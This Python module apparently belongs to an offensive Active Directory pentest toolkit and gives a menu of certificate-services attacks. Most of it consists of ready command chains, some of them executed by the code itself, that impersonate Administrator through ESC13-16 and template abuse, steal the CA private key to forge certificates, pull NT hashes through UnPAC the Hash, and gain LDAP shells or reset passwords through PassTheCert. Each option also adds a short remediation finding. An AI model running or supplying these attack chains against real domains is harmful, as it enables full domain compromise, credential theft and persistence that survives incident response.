"""
Module: Golden Certificate & Advanced ADCS Attacks
Techniques:
  - ESC13 — IssuancePolicy OID → group membership certificate mapping
  - ESC14 — altSecurityIdentities write → arbitrary cert auth
  - ESC15 — EKUwu / arbitrary Application Policies (CVE-2024-49019)
  - ESC16 — CA-wide SID extension omission
  - Golden Certificate — CA private key theft + ForgeCert (forever persistence)
  - CA Managers abuse — WriteDACL on templates → ESC4→ESC1 pivot
  - UnPAC the Hash — cert → NT hash via S4U2Self + U2U
  - PassTheCert — cert auth without PKINIT (LDAP Schannel)
"""
from utils.helpers import *
from config.settings import SESSION

MENU = """
  ── ADVANCED ADCS ATTACKS ────────────────────────────────────────
  [1]  Certipy Full Scan (Kerberos-aware, all ESCs)
  [2]  ESC13 — IssuancePolicy OID Mapping           (cert → group)
  [3]  ESC14 — altSecurityIdentities Write          (arbitrary cert auth)
  [4]  ESC15 — EKUwu / App Policy Injection         (CVE-2024-49019)
  [5]  ESC16 — CA SID Extension Omission            (no account binding)
  [6]  ESC4  → ESC1 Pivot                           (CA Managers abuse)
  [7]  Golden Certificate — CA Private Key Theft    (ForgeCert / Mimikatz)
  [8]  UnPAC the Hash                               (cert → NT hash)
  [9]  PassTheCert (non-PKINIT LDAP Schannel auth)
  [10] CA Managers & Template ACL Abuse
  [0]  Back
"""


def run():
    print_banner("GOLDEN CERTIFICATE", "Advanced ADCS — ESC13/14/15/16 + CA Key Theft")
    dc   = input_or_session("dc_ip",    "DC IP")
    dom  = input_or_session("domain",   "Domain")
    user = input_or_session("username", "Username")
    pw   = input_or_session("password", "Password")

    krb   = SESSION.get("use_kerberos") and SESSION.get("krb5_ccache")
    fqdn  = SESSION.get("dc_fqdn") or f"dc1.{dom}"
    realm = dom.upper()

    if krb:
        ccache   = SESSION["krb5_ccache"]
        certipy_auth = f"-u '{user}@{dom}' -k -no-pass"
        env_prefix   = f"KRB5CCNAME={ccache} "
    else:
        certipy_auth = f"-u '{user}@{dom}' -p '{pw}'"
        env_prefix   = ""

    print(MENU)
    c = input(f"  {M}Choice:{RST} ").strip()

    # ── [1] Full certipy scan ─────────────────────────────────────────────────
    if c == "1":
        info("Running certipy find with all ESC checks...")
        run_cmd(f"{env_prefix}certipy find {certipy_auth} -dc-ip {dc} -vulnerable -stdout")
        run_cmd(f"{env_prefix}certipy find {certipy_auth} -dc-ip {dc} -enabled -stdout")
        info("Tip: certipy find outputs JSON — use 'certipy find -json' for machine-readable")
        add_finding("ADCS Scan Complete", "Info",
                    "Certipy vulnerability scan completed — review ESC findings above",
                    "Patch each ESC per Microsoft guidance")

    # ── [2] ESC13 ─────────────────────────────────────────────────────────────
    elif c == "2":
        template = prompt("Vulnerable template name (e.g. TemporaryWinRM)")
        ca       = prompt("CA name (e.g. DOMAIN-DC1-CA)")
        target_group = prompt("Group mapped by OID policy (e.g. TempWinRMAccess)")
        print(f"""
  {NEON_CYN}ESC13 — IssuancePolicy OID Group Mapping:{RST}
  {DIM}The template has an IssuancePolicy that maps to an AD group via
  msDS-OIDToGroupLink. Certificate holders automatically become members
  of that group — even privileged groups like Domain Admins.{RST}

  ── Step 1: Request certificate ──────────────────────────────────────────
  {env_prefix}certipy req {certipy_auth} -dc-ip {dc} \\
    -template '{template}' -ca '{ca}'
  # Saved as: {user}.pfx

  ── Step 2: Authenticate + get TGT with group membership ──────────────────
  {env_prefix}certipy auth -pfx {user}.pfx -domain {dom} -dc-ip {dc}
  # Returns TGT with {target_group} group membership!
  export KRB5CCNAME={user}.ccache

  ── Step 3: Use the group membership ─────────────────────────────────────
  evil-winrm -i {fqdn} -r {realm}   # if group = WinRM/Remote Mgmt
  nxc smb {dc} -u {user} -k --kdcHost {dc} --shares
""")
        run_cmd(f"{env_prefix}certipy req {certipy_auth} -dc-ip {dc} "
                f"-template '{template}' -ca '{ca}'")
        if run_cmd(f"test -f {user}.pfx && echo found", capture=True).strip():
            run_cmd(f"{env_prefix}certipy auth -pfx {user}.pfx -domain {dom} -dc-ip {dc}")
        add_finding("ESC13 — IssuancePolicy OID Mapping", "Critical",
                    f"Template {template} maps certificate to {target_group} group via OID",
                    "Remove msDS-OIDToGroupLink on sensitive templates; audit OID mappings")

    # ── [3] ESC14 ─────────────────────────────────────────────────────────────
    elif c == "3":
        target_account = prompt("Target account to compromise (e.g. Administrator)")
        attacker_cert  = prompt("Attacker certificate subject (CN=...)")
        print(f"""
  {NEON_CYN}ESC14 — altSecurityIdentities Write:{RST}
  {DIM}With WriteProperty on altSecurityIdentities of {target_account},
  map your certificate to their account. Then authenticate as them
  using your cert — no password required.
  Bypasses szOID_NTDS_CA_SECURITY_EXT protection.{RST}

  ── Step 1: Generate attacker cert (self-signed or from any CA) ───────────
  openssl req -x509 -newkey rsa:2048 -keyout attacker.key -out attacker.crt \\
    -days 365 -nodes -subj "/CN={attacker_cert}"
  openssl pkcs12 -export -out attacker.pfx -inkey attacker.key \\
    -in attacker.crt -passout pass:

  ── Step 2: Add cert mapping to target account ────────────────────────────
  # Format: X509:<I>IssuerDN<S>SubjectDN
  certipy account -u '{user}@{dom}' {"-k -no-pass" if krb else f"-p '{pw}'"} \\
    -dc-ip {dc} -user '{target_account}' \\
    -altname "X509:<I>CN={attacker_cert}<S>CN={attacker_cert}"

  # OR via bloodyAD:
  bloodyAD {"-k" if krb else f"--password '{pw}'"} \\
    --host {fqdn} -d {dom} -u {user} \\
    set object '{target_account}' altSecurityIdentities \\
    -v "X509:<I>CN={attacker_cert}<S>CN={attacker_cert}"

  ── Step 3: Authenticate as target using attacker cert ────────────────────
  certipy auth -pfx attacker.pfx -username {target_account} \\
    -domain {dom} -dc-ip {dc}
""")
        add_finding("ESC14 — altSecurityIdentities Writable", "Critical",
                    f"WriteProperty on altSecurityIdentities allows arbitrary cert-to-account mapping",
                    "Restrict WriteProperty on altSecurityIdentities; enable Protected Users")

    # ── [4] ESC15 ─────────────────────────────────────────────────────────────
    elif c == "4":
        ca = prompt("CA name")
        print(f"""
  {NEON_CYN}ESC15 — EKUwu / CVE-2024-49019 (Arbitrary Application Policy Injection):{RST}
  {DIM}V1 certificate templates allow CSR to inject arbitrary Application
  Policies that override the template's EKU. The default WebServer template
  (all authenticated users can enroll) becomes a DA escalation path.
  PATCHED November 2024 — works on unpatched systems.{RST}

  ── Check vulnerable templates ────────────────────────────────────────────
  certipy find {certipy_auth} -dc-ip {dc} -vulnerable -stdout | grep -A5 ESC15

  ── Exploit (Certipy v5+) ────────────────────────────────────────────────
  certipy req {certipy_auth} -dc-ip {dc} \\
    -ca '{ca}' -template 'WebServer' \\
    -upn 'administrator@{dom}' \\
    -application-policies 'Client Authentication'

  ── Manual CSR injection (EKUwu) ─────────────────────────────────────────
  # Generate CSR with injected application policy OID
  python3 /opt/EKUwu/ekuwu.py --ca {ca} --template WebServer \\
    --dc-ip {dc} --upn administrator@{dom} \\
    --output /tmp/esc15_admin.pfx
""")
        add_finding("ESC15 (CVE-2024-49019) — EKU Injection", "Critical",
                    "V1 template allows Application Policy injection via CSR",
                    "Apply November 2024 Patch Tuesday (KB5044284); disable V1 schema templates")

    # ── [5] ESC16 ─────────────────────────────────────────────────────────────
    elif c == "5":
        print(f"""
  {NEON_CYN}ESC16 — CA-Wide SID Extension Omission:{RST}
  {DIM}When the CA is configured to NOT include szOID_NTDS_CA_SECURITY_EXT
  in issued certificates, account binding via SID is disabled for ALL certs.
  Combined with ESC6/ESC9 → impersonate any account.{RST}

  ── Check if CA omits SID extension ─────────────────────────────────────
  certipy find {certipy_auth} -dc-ip {dc} -vulnerable -stdout | grep -i "ESC16\\|SID"

  ── Exploit (requires additional weak mapping): ────────────────────────────
  # Enable weak certificate mapping (if not already)
  # Then request cert without SAN restriction + authenticate

  certipy req {certipy_auth} -dc-ip {dc} \\
    -ca '<CA>' -template 'User' \\
    -upn 'administrator@{dom}'

  certipy auth -pfx administrator.pfx -domain {dom} -dc-ip {dc}
""")
        run_cmd(f"{env_prefix}certipy find {certipy_auth} -dc-ip {dc} -vulnerable -stdout")
        add_finding("ESC16 — CA SID Extension Omission", "Critical",
                    "CA does not include SID extension — account binding disabled domain-wide",
                    "Enable szOID_NTDS_CA_SECURITY_EXT on CA; enforce strong certificate mapping")

    # ── [6] ESC4 → ESC1 pivot ────────────────────────────────────────────────
    elif c == "6":
        template = prompt("Target template name (e.g. SmartcardAuthentication)")
        ca       = prompt("CA name")
        print(f"""
  {NEON_CYN}ESC4 → ESC1 Pivot (CA Managers / WriteDACL on Template):{RST}
  {DIM}CA Managers / Template owners can modify certificate templates.
  Modify the template to enable ESC1 (allow user-supplied SAN),
  request admin cert, then restore the template.{RST}

  ── Step 1: Modify template to enable ESC1 ────────────────────────────────
  {env_prefix}certipy template {certipy_auth} -dc-ip {dc} \\
    -template '{template}' -save-old
  # Certipy automatically enables ENROLLEE_SUPPLIES_SUBJECT (ESC1)

  ── Step 2: Request admin cert ───────────────────────────────────────────
  {env_prefix}certipy req {certipy_auth} -dc-ip {dc} \\
    -ca '{ca}' -template '{template}' \\
    -upn 'Administrator@{dom}'

  ── Step 3: Restore template ─────────────────────────────────────────────
  {env_prefix}certipy template {certipy_auth} -dc-ip {dc} \\
    -template '{template}' -configuration <saved_old_config>

  ── Step 4: Authenticate as Administrator ─────────────────────────────────
  {env_prefix}certipy auth -pfx administrator.pfx -domain {dom} -dc-ip {dc}
  export KRB5CCNAME=administrator.ccache
""")
        run_cmd(f"{env_prefix}certipy template {certipy_auth} -dc-ip {dc} "
                f"-template '{template}' -save-old")
        add_finding("ESC4 → ESC1 Template Modification", "Critical",
                    f"Template {template} modified to allow SAN → admin cert obtained",
                    "Restrict template modification to CA admins only; audit template ACL changes")

    # ── [7] Golden Certificate ────────────────────────────────────────────────
    elif c == "7":
        ca_server = prompt("CA server hostname/IP")
        print(f"""
  {NEON_CYN}Golden Certificate — CA Private Key Theft + ForgeCert:{RST}
  {DIM}ULTIMATE ADCS persistence. Stolen CA private key forges certificates
  for ANY account indefinitely. Cannot be revoked without rebuilding PKI.
  Survives: DA password reset, krbtgt rotation, incident response.{RST}

  ── Step 1: Extract CA private key (from CA server — requires admin) ───────
  # Via Mimikatz (on CA server):
  crypto::capi
  crypto::certificates /export /systemstore:LOCAL_MACHINE

  # Via SharpDPAPI:
  .\\SharpDPAPI.exe certificates /machine

  # Via certipy (from Linux, if CA server accessible):
  {env_prefix}certipy ca {certipy_auth} -dc-ip {dc} \\
    -ca '{ca_server}' -backup

  ── Step 2: Forge certificate with ForgeCert ─────────────────────────────
  ForgeCert.exe \\
    --CaCertPath ca.pfx --CaCertPassword '' \\
    --Subject "CN=Administrator" \\
    --SubjectAltName "administrator@{dom}" \\
    --NewCertPath forged_admin.pfx --NewCertPassword ''

  # Linux (certipy):
  {env_prefix}certipy forge -ca-pfx ca.pfx \\
    -upn administrator@{dom} \\
    -subject 'CN=Administrator,DC={dom.split(".")[0]},DC={dom.split(".")[-1] if "." in dom else dom}'

  ── Step 3: Authenticate ─────────────────────────────────────────────────
  {env_prefix}certipy auth -pfx forged_admin.pfx -domain {dom} -dc-ip {dc}
  export KRB5CCNAME=administrator.ccache
""")
        run_cmd(f"{env_prefix}certipy ca {certipy_auth} -dc-ip {dc} -ca '{ca_server}' -backup")
        add_finding("Golden Certificate — CA Key Extracted", "Critical",
                    f"CA private key extracted from {ca_server} — all certs forgeable indefinitely",
                    "CA private key compromise requires PKI rebuild; implement CA key protection (HSM)")

    # ── [8] UnPAC the Hash ────────────────────────────────────────────────────
    elif c == "8":
        pfx = prompt("PFX certificate file path")
        target_user = prompt(f"Username in certificate (default: {user})") or user
        print(f"""
  {NEON_CYN}UnPAC the Hash — Certificate → NT Hash via S4U2Self + U2U:{RST}
  {DIM}After obtaining a certificate (Shadow Creds, ADCS ESC, etc.),
  perform S4U2Self + U2U to extract the NT hash from the PAC.
  Enables Pass-the-Hash even in Kerberos-only environments.{RST}
""")
        # certipy auth automatically performs UnPAC
        run_cmd(f"{env_prefix}certipy auth -pfx '{pfx}' -domain {dom} "
                f"-dc-ip {dc} -username '{target_user}'")
        info("certipy auth automatically extracts NT hash via UnPAC")
        # PKINITtools getnthash.py
        print(f"""
  ── Alternative: PKINITtools getnthash.py ─────────────────────────────────
  python3 /opt/PKINITtools/gettgtpkinit.py {dom}/{target_user} /tmp/{target_user}.ccache \\
    -cert-pfx '{pfx}' -dc-ip {dc}
  export KRB5CCNAME=/tmp/{target_user}.ccache
  python3 /opt/PKINITtools/getnthash.py {dom}/{target_user} \\
    -key $(klist -e | grep "Session key" | awk '{{print $NF}}')

  ── After NT hash: Pass-the-Hash ──────────────────────────────────────────
  {imp('wmiexec.py')} -hashes :{'{NT_HASH}'} {dom}/{target_user}@{dc}
  nxc smb {dc} -u {target_user} -H <NT_HASH> -d {dom}
""")
        add_finding("UnPAC the Hash", "Critical",
                    f"NT hash extracted via certificate-based S4U2Self+U2U for {target_user}",
                    "Enforce Protected Users group (prevents NTLM); monitor S4U2Self usage")

    # ── [9] PassTheCert ───────────────────────────────────────────────────────
    elif c == "9":
        pfx  = prompt("PFX file path")
        target = prompt("Target account (e.g. administrator@domain)")
        print(f"""
  {NEON_CYN}PassTheCert — Non-PKINIT Certificate Auth via LDAP Schannel:{RST}
  {DIM}When PKINIT is not available (no smartcard EKU on DC cert),
  authenticate directly to LDAP/S using TLS client certificate.
  Enables: DCSync, password resets, ACL modifications — no TGT needed.{RST}

  ── passthecert.py (AlmondOffSec) ────────────────────────────────────────
  # DCSync via PassTheCert:
  python3 /opt/passthecert/passthecert.py \\
    -pfx-cert '{pfx}' -dc-ip {dc} \\
    -domain {dom} \\
    --action ldap-shell

  # Grant DCSync rights:
  python3 /opt/passthecert/passthecert.py \\
    -pfx-cert '{pfx}' -dc-ip {dc} -domain {dom} \\
    --action modify_user --target {target} \\
    --elevate

  # Reset user password:
  python3 /opt/passthecert/passthecert.py \\
    -pfx-cert '{pfx}' -dc-ip {dc} -domain {dom} \\
    --action modify_user --target {target} \\
    --new-pass 'NewP@ss123!'
""")
        run_cmd(f"python3 /opt/passthecert/passthecert.py "
                f"-pfx-cert '{pfx}' -dc-ip {dc} -domain {dom} --action ldap-shell")
        add_finding("PassTheCert — LDAP Schannel Auth", "Critical",
                    "Certificate used for direct LDAP authentication bypassing password/TGT",
                    "Enforce LDAP channel binding; disable TLS client cert auth on LDAP")

    # ── [10] CA Managers ──────────────────────────────────────────────────────
    elif c == "10":
        print(f"""
  {NEON_CYN}CA Managers & Template ACL Abuse:{RST}
  {DIM}CA Managers have WriteDACL on certificate templates.
  This allows converting any template to ESC1 (user-supplied SAN).
  See option [6] for the full ESC4→ESC1 attack chain.{RST}

  ── Enumerate CA Managers ────────────────────────────────────────────────
  {env_prefix}certipy find {certipy_auth} -dc-ip {dc} -stdout | grep -A10 "CA Manager"

  ── Check template ACLs ───────────────────────────────────────────────────
  {env_prefix}certipy find {certipy_auth} -dc-ip {dc} -enabled -stdout | \\
    grep -B2 -A20 "ESC4\\|WriteDacl\\|Write Owner"

  ── List all CAs and their managers ──────────────────────────────────────
  ldapsearch -x -H ldaps://{dc}:636 -D '{user}@{dom}' \\
    -b 'CN=Public Key Services,CN=Services,CN=Configuration,DC={",DC=".join(dom.split("."))}' \\
    '(objectClass=pKIEnrollmentService)' cn
""")
        run_cmd(f"{env_prefix}certipy find {certipy_auth} -dc-ip {dc} -vulnerable -stdout")

    pause()
